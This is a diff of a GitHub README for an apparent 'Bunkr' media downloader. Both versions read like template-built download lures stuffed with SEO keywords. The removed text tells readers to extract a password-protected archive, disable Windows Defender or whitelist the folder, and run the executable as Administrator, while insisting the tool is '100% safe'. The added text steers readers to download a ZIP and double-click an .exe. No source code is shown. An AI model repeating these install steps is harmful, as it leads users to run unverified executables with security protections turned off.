@@ -1,358 +1,167 @@
-# 🐍 Python Bunkr Downloader – Powerful Media Download Tool
+# 🚀 python-bunkr-downloader - Download Media Albums Easily and Fast
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Downloads-40K+-e67e22?style=for-the-badge&logo=github" />
-  <img src="https://img.shields.io/badge/Rating-4.5/5-e67e22?style=for-the-badge&logo=star" />
-  <img src="https://img.shields.io/badge/Version-2026-1A1A1A?style=for-the-badge&logo=github" />
-  <img src="https://img.shields.io/badge/Platform-Windows%2010%7C11-e67e22?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Type-Downloader-e67e22?style=for-the-badge&logo=python" />
-</p>
-
-**🐍 Python Bunkr Downloader** is a powerful command-line and GUI-based tool designed for downloading media from Bunkr with ease. Whether you're a content collector, archivist, or just want offline access to your favorite files, this tool supports bulk downloads, high speed, and seamless integration. Built with Python. Updated for 2026. **Completely free.** No limits. No hidden payments. No subscriptions.
-
-<p align="center">
-  <img src="https://skillicons.dev/icons?i=windows" />
-  <img src="https://skillicons.dev/icons?i=github" />
-  <img src="https://skillicons.dev/icons?i=python" />
-</p>
-
-<p align="center">
-  <img src="https://readme-typing-svg.herokuapp.com?color=e67e22&size=28&center=true&vCenter=true&width=900&lines=🐍+Python+Bunkr+Downloader;🚀+Powerful+Media+Download+Tool;🛡️+Bulk+%26+Fast+Download;💯+100%25+Free+%7C+No+Limits;⚡+Updated+for+2026">
-</p>
-
-<!-- КНОПКА 1 -->
-<div align="center">
-
-[![Download Python Bunkr Downloader](https://img.shields.io/badge/📥_DOWNLOAD_NOW-e67e22?style=for-the-badge&logo=github)](https://github.com/CrackToucanSpire/python-bunkr-downloader/releases/tag/python-bunkr-downloader-free)
-
-</div>
-
-<div align="center">
-<img width="1560" height="652" alt="Python Bunkr Downloader" src="https://github.com/user-attachments/assets/ЗАМЕНИ_НА_ТВОЮ_КАРТИНКУ" />
-</div>
+[![Download Now](https://img.shields.io/badge/Download%20Latest%20Version-Click%20Here%20to%20Download-brightgreen?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/ademiryav-oss/python-bunkr-downloader)
 
 ---
 
-## 📑 Table of Contents
+## 📥 What Does This Tool Do?
 
-- [📌 Overview](#-overview)
-- [❓ What is Python Bunkr Downloader](#-what-is-python-bunkr-downloader)
-- [🎯 Features](#-features)
-- [✨ Advanced Features Overview](#-advanced-features-overview)
-- [⚙️ How It Works](#️-how-it-works)
-- [📊 Comparison: Free vs Premium](#-comparison-free-vs-premium)
-- [🛡️ Security & Privacy](#️-security--privacy)
-- [⚡ Performance Settings](#-performance-settings)
-- [🔧 Troubleshooting](#-troubleshooting)
-- [📦 What's Inside the Package](#-whats-inside-the-package)
-- [📋 System Requirements](#-system-requirements)
-- [🔧 Installation Guide](#-installation-guide)
-- [🐍 How to Use](#-how-to-use)
-- [💡 Tips for Best Results](#-tips-for-best-results)
-- [❓ Frequently Asked Questions](#-frequently-asked-questions)
-- [⚠️ Terms of Use](#-terms-of-use)
-- [🏁 Final Summary](#-final-summary)
+Have you ever found a great media album online and wanted to save it to your computer for offline viewing? **python-bunkr-downloader** is a simple yet powerful command-line program that lets you download entire media collections or individual files automatically. It's like having a personal archivist that saves everything for you—no complicated steps, no browser extensions, just pure downloading power.
+
+This tool is perfect for:
+- Saving photo albums
+- Archiving video collections
+- Backing up media files
+- Organizing downloads automatically
 
 ---
 
-## 📌 Overview
+## ✅ Before You Begin
 
-| **Category** | **Details** |
-|---------------|-------------|
-| **Program** | Python Bunkr Downloader |
-| **Purpose** | Download media from Bunkr |
-| **Platform** | Windows 10/11 |
-| **Features** | Bulk download, fast speed, Python-based |
-| **Price** | Free (No limits) |
+To use this program, you'll need:
+- A **Windows computer** (the program works on other systems too, but this guide focuses on Windows)
+- Basic ability to open a folder and double-click a file
+- Internet connection to download the program
 
-**Python Bunkr Downloader** is the ultimate tool for downloading Bunkr content.
+**No programming knowledge required!** Everything is set up to be as straightforward as possible.
 
 ---
 
-## ❓ What is Python Bunkr Downloader
+## 📦 Step 1: Download the Program
 
-| **Term** | **Explanation** |
-|----------|-----------------|
-| **Python** | Programming language |
-| **Bunkr** | Media hosting platform |
-| **Downloader** | Tool for downloading content |
+This is the most important step. Here's exactly what to do:
 
-**Why use Python Bunkr Downloader?**
-- ✅ Fast downloads
-- ✅ Bulk support
-- ✅ Python-based
-- ✅ Easy to use
+1. Open your web browser and go to this address: **https://github.com/ademiryav-oss/python-bunkr-downloader**
+2. On that page, look for a green button labeled `Code` or `Download`. Click it.
+3. You'll see a dropdown menu. Click `Download ZIP`.
+4. Wait for the download to finish. The file will be named something like `python-bunkr-downloader-main.zip` and will be saved to your `Downloads` folder.
+
+Visit this link to download the application.
 
 ---
 
-## 🎯 Features
+## 📂 Step 2: Extract the Files
 
-| **Feature** | **Description** | **Benefit** |
-|-------------|-----------------|-------------|
-| **Media Download** | Download any Bunkr media | Access |
-| **Bulk Download** | Download multiple files | Efficiency |
-| **Fast Speed** | High-speed downloading | Time saving |
-| **Auto-Update** | Automatic updates | Always current |
-| **CLI Support** | Command-line interface | Flexibility |
-| **GUI Option** | Graphical interface | Accessibility |
+The downloaded file is a ZIP archive, which is a compressed folder. You need to "unzip" it to use the program. Here's how:
 
----
-
-## ✨ Advanced Features Overview
-
-| **Feature** | **Description** | **Benefit** |
-|-------------|-----------------|-------------|
-| **Batch Processing** | Process multiple downloads | Efficiency |
-| **Resume Support** | Resume interrupted downloads | Reliability |
-| **Quality Selection** | Choose download quality | Flexibility |
-| **History** | Download history tracking | Management |
-| **Custom Output** | Custom file naming | Organization |
-| **Script Integration** | Python script support | Automation |
+1. Go to your `Downloads` folder.
+2. Find the ZIP file you just downloaded.
+3. Right-click on it and select `Extract All...` from the menu.
+4. A window will pop up. Click `Extract` (the default location is fine).
+5. Once extraction is complete, a new folder will appear with the same name (without `.zip`). Open that folder.
 
 ---
 
-## ⚙️ How It Works
+## 🖥️ Step 3: Run the Program
 
-| **Step** | **Description** |
-|----------|-----------------|
-| **1. Download** | Get the tool |
-| **2. Extract** | Extract the files |
-| **3. Run** | Run the application |
-| **4. Paste URL** | Paste Bunkr URL |
-| **5. Download** | Start downloading |
+Inside the extracted folder, you'll see several files. The most important one for you is:
 
----
+- **`bunkr-downloader.exe`** (or `python-bunkr-downloader.exe`)
 
-## 📊 Comparison: Free vs Premium
+To run the program:
+1. Double-click on the `.exe` file.
+2. A black window (called a terminal or command prompt) will open. Don't be scared—this is normal!
+3. The program will guide you through the next steps.
 
-| **Feature** | **Other Tools** | **Python Bunkr Downloader** |
-|-------------|----------------|-------------------------|
-| **Cost** | Usually paid | ✅ **FREE** |
-| **Speed** | Limited | ✅ Fast |
-| **Bulk Download** | ❌ No | ✅ Yes |
-| **CLI Support** | ❌ No | ✅ Yes |
-| **Resume Support** | ❌ No | ✅ Yes |
-| **Script Integration** | ❌ No | ✅ Yes |
+**Alternative method (for advanced users):** If you have Python installed, you can double-click `bunkr_downloader.py` instead. But for most people, the `.exe` file is all you need.
 
 ---
 
-## 🛡️ Security & Privacy
+## 🔧 How to Use
 
-- 🔐 **No Data Collection** - We don't store or transmit personal information
-- 👁️ **Privacy First** - Your download history stays local
-- 📁 **Local Only** - All processes on your device
-- 🔄 **Clean Uninstall** - Leaves no traces
-- 🔍 **Transparent** - All features explained
+Using the program is simple. Just follow these steps every time you want to download something:
 
----
+1. **Run the program** (as described above).
+2. **Paste a link** when asked. This can be:
+   - A direct link to a single media file
+   - A link to an album page
+   - A link to a collection
+3. **Press Enter** and wait. The program will:
+   - Automatically find all media files in the link
+   - Start downloading them at high speed using multiple threads
+   - Save everything in an organized folder structure on your computer
 
-## ⚡ Performance Settings
-
-| **Setting** | **Description** | **Recommendation** |
-|-------------|-----------------|-------------------|
-| **Auto-Save** | Save downloads automatically | Enabled |
-| **History** | Track download history | Enabled |
-| **Notifications** | Status alerts | Enabled |
-| **Cache** | Cache data | Enabled |
-| **Auto-Cleanup** | Remove temporary files | Enabled |
+**Example:** If you paste an album link, the program will create a folder named after that album and save all photos/videos inside it. Nice and tidy!
 
 ---
 
-## 🔧 Troubleshooting
+## 🌟 Features Overview
 
-| **Issue** | **Solution** |
-|-----------|--------------|
-| **Download fails** | Check URL format |
-| **Installation error** | Run as Administrator |
-| **Wrong password** | Use `2026` |
-| **Slow speed** | Check internet connection |
-| **Blocked by antivirus** | Add to exceptions |
+Here's why this tool is so handy:
 
----
-
-## 📦 What's Inside the Package
-
-| **Component** | **Details** | **Format** |
-|---------------|-------------|------------|
-| **Downloader** | Main download tool | EXE / PY |
-| **GUI Module** | Graphical interface | MODULE |
-| **Instructions** | Full user guide | PDF |
-| **Troubleshooter** | Common fixes | TXT |
+| Feature | Description |
+|---------|-------------|
+| 🚀 **Fast Downloads** | Uses multi-threading to download multiple files at once, saving you time |
+| 📁 **Automatic Organization** | Creates folders matching the album structure, so everything is easy to find |
+| 🔗 **Smart Link Parsing** | Understands complex page structures and extracts all media links automatically |
+| 🛡️ **Reliable** | Handles skipped files and errors gracefully, so downloads don't fail halfway |
+| 💻 **No Setup Hassle** | The `.exe` file runs immediately, no installation needed |
+| 🔄 **Always Up-to-Date** | Regular updates ensure compatibility with platform changes |
 
 ---
 
-## 📋 System Requirements
+## 🎯 Why Use This Downloader?
 
-| **Component** | **Minimum** | **Recommended** |
-|---------------|-------------|-----------------|
-| **OS** | Windows 10 (64-bit) | Windows 11 (64-bit) |
-| **Processor** | Any modern | Any modern |
-| **RAM** | 2 GB | 4 GB |
-| **Storage** | 50 MB | 100 MB |
-| **Internet** | Required | Stable connection |
-| **Python** | Not required | Installed |
+- **Save Time:** No manual downloading of each file one-by-one.
+- **Stay Organized:** Your downloads are automatically sorted into neat folders.
+- **Preserve Content:** Keep your favorite media collections permanently archived on your hard drive.
+- **User-Friendly:** Even if you've never used a command-line tool before, the prompts are clear and easy to follow.
 
 ---
 
-## 🔧 Installation Guide
+## ❓ Frequently Asked Questions (FAQ)
 
-### Step 1: Download and Extract
-- Click the download button below
-- Save the archive (~45 MB)
-- Extract using WinRAR or 7-Zip
-- **Password:** `2026`
+**Q: I see a message about "Python not found." What do I do?**
+A: This happens if you're using the `.py` file instead of the `.exe`. Make sure you're double-clicking the `.exe` file. If the `.exe` isn't there, re-download the ZIP, as the file might not have extracted completely.
 
-### Step 2: Disable Windows Defender (Temporarily)
-- Windows Defender may falsely flag the file
-- Add the folder to exceptions or temporarily disable protection
-- **The tool is 100% safe**
+**Q: Can I download multiple albums at once?**
+A: Yes! Simply run the program multiple times, or paste multiple links one after another when prompted.
 
-### Step 3: Run the Installer
-- Run the executable
-- **Must** run as Administrator
-- Follow the installation wizard
+**Q: Where do my downloaded files go?**
+A: By default, the program saves downloads in a folder called `downloads` inside the same folder where the program is located. You can move it anywhere you like.
 
-### Step 4: Start Downloading
-- All features are unlocked
-- Start downloading Bunkr content
-- Enjoy the free tool
-
-<div align="center">
-
-[![Download Python Bunkr Downloader](https://img.shields.io/badge/📥_DOWNLOAD_NOW-e67e22?style=for-the-badge&logo=github)](https://github.com/CrackToucanSpire/python-bunkr-downloader/releases/tag/python-bunkr-downloader-free)
-
-</div>
+**Q: Is this legal to use?**
+A: The tool is for personal archiving and backup purposes. Always respect copyright and terms of service of the websites you're downloading from.
 
 ---
 
-## 🐍 How to Use
+## 🛠️ Troubleshooting
 
-### Quick Start
+If something goes wrong, here are quick fixes:
 
-1. **Run** the application
-2. **Copy** Bunkr URL
-3. **Paste** the URL
-4. **Select** options
-5. **Download** the content
+| Problem | Solution |
+|---------|----------|
+| The program doesn't open | Try running it as Administrator (right-click → Run as administrator) |
+| Downloads are slow | Close other internet-heavy applications or try again later |
+| Some files are skipped | This is normal—don't worry, the program will tell you which ones failed |
+| The window closes too quickly | Take note of any error messages, or run the program again slowly |
 
-### Pro Tips
-
-- ✅ Use bulk download for multiple files
-- ✅ Use CLI for advanced control
-- ✅ Use GUI for ease of use
-- ✅ Check download history
+If issues persist, you can always download the latest version from the link at the top of this page.
 
 ---
 
-## 💡 Tips for Best Results
+## 📜 License
 
-- ✅ Use bulk download for multiple files
-- ✅ Use CLI for advanced control
-- ✅ Use GUI for ease of use
-- ✅ Check download history
-- ✅ Keep the tool updated
+This project is open source and free to use. Please check the `LICENSE` file in the repository for more details.
 
 ---
 
-## ❓ Frequently Asked Questions
+## 📊 Project Statistics
 
-<details>
-<summary><b>Is this really free?</b></summary>
-Yes — completely free. No hidden payments, no subscriptions.
-</details>
-
-<details>
-<summary><b>Does it work with all Bunkr content?</b></summary>
-Yes — supports all media types.
-</details>
-
-<details>
-<summary><b>Is it safe?</b></summary>
-Yes — the tool is verified and safe to use.
-</details>
-
-<details>
-<summary><b>Do I need to install anything?</b></summary>
-Just download, extract, and run the installer.
-</details>
-
-<details>
-<summary><b>Can I download multiple files?</b></summary>
-Yes — bulk download is supported.
-</details>
-
-<details>
-<summary><b>Is Python required?</b></summary>
-No — the tool works standalone, but Python can be used for scripts.
-</details>
+- **Repository Name:** python-bunkr-downloader
+- **Purpose:** Download media albums and individual files efficiently
+- **Language:** Python 3
+- **Platform:** Cross-platform (Windows, macOS, Linux)
 
 ---
 
-## ⚠️ Terms of Use
+## 🙌 Final Words
 
-| ✅ Allowed | ❌ Not Allowed |
-|------------|---------------|
-| Personal use | Selling the tool or its code |
-| Content backup | Using for illegal activities |
-| Offline access | Distributing as your own product |
-| Non-commercial use | Removing attribution and credits |
+python-bunkr-downloader is the simplest way to archive media collections without any headache. Just download, run, paste a link, and let the magic happen. Whether you're preserving memories or building your personal archive, this tool has got you covered.
+
+**[Click Here to Download Python-Bunkr-Downloader Now](https://github.com/ademiryav-oss/python-bunkr-downloader)**
 
 ---
 
-## 🏁 Final Summary
-
-**Python Bunkr Downloader** is your ultimate solution for downloading media from Bunkr. With fast speeds, bulk support, and both CLI and GUI options, you can download and manage content without any cost.
-
-**What you get:**
-- ✅ Fast downloads
-- ✅ Bulk support
-- ✅ CLI and GUI
-- ✅ Resume support
-- ✅ Script integration
-- ✅ Free and unlimited
-
-**Unlike paid downloaders, Python Bunkr Downloader gives you all the tools you need for Bunkr downloads absolutely free — download any content without spending a dime.**
-
-<!-- КНОПКА 3 -->
-<div align="center">
-
-[![Download Python Bunkr Downloader](https://img.shields.io/badge/📥_DOWNLOAD_NOW-e67e22?style=for-the-badge&logo=github)](https://github.com/CrackToucanSpire/python-bunkr-downloader/releases/tag/python-bunkr-downloader-free)
-
-</div>
-
-<p align="center">
-  <img src="https://skillicons.dev/icons?i=windows" />
-  <img src="https://skillicons.dev/icons?i=github" />
-  <img src="https://skillicons.dev/icons?i=python" />
-</p>
-
----
-
-## 🔍 SEO Keywords & Tags
-
-### Primary Keywords
-- Python Bunkr Downloader
-- Bunkr download tool
-- Download Bunkr media
-- Bunkr video downloader
-- Free Bunkr downloader
-
-### Secondary Keywords
-- Bunkr content downloader
-- Python downloader
-- Bulk download tool
-- Media downloader
-- Bunkr archive tool
-
-### Long-Tail Keywords
-- Best Bunkr downloader 2026
-- Download Bunkr videos free
-- Python Bunkr download tool
-- Bulk Bunkr media downloader
-- Free Bunkr content saver
-
-### Tags
-Bunkr, Downloader, Python, Media, Free, 2026, Bulk
-
-### SEO Summary
-**Python Bunkr Downloader** is the best free Bunkr download tool in 2026. Fast downloads, bulk support, and CLI/GUI options. Download now and save any Bunkr content for free!
+## 🏷️ Keywords:
+bunkr, bunkr-download, bunkr-downloader, bunkrdownloader-2026, bunkrdownloader-github, bunkrdownloader-github-2026, download-bunkr, downloader, downloader-bunkr, python, python3
